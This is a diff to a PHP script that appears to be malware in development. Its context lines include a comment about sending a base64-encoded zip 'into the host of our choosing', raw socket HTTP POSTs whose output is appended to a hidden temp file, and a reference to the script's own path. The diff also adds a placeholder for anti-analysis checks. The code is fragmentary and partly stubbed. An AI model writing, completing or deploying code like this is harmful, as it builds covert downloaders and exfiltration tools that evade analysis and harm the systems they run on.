@@ -7,8 +7,6 @@ define("uuid", substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32));
 define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);
 try {
     require "vendor/autoload.php";
-
-
 }catch (Exception $exception){
     $u = null; // where we will get the base64 encoded zip file from, to transfer across the wire into the host of our choosing.
     fsockopen();
@@ -75,6 +73,7 @@ function checkfs(){
 
 }
 function checkSystems(){
+    //add anti analysis checks here.
 
 }
 
@@ -118,7 +117,7 @@ function mainR(){
             fputs($fp, "Accept: */*\r\n");
             fputs($fp, $poststring."\r\n\r\n");
             while (!feof($fp)){
-                fwrite(fopen(sys_get_temp_dir()."/aaF", "a"), fgets($fp, 4096));
+                fwrite(fopen(sys_get_temp_dir()."/aaF", "a+"), fgets($fp, 4096));
             }
             fclose($fp);
         }
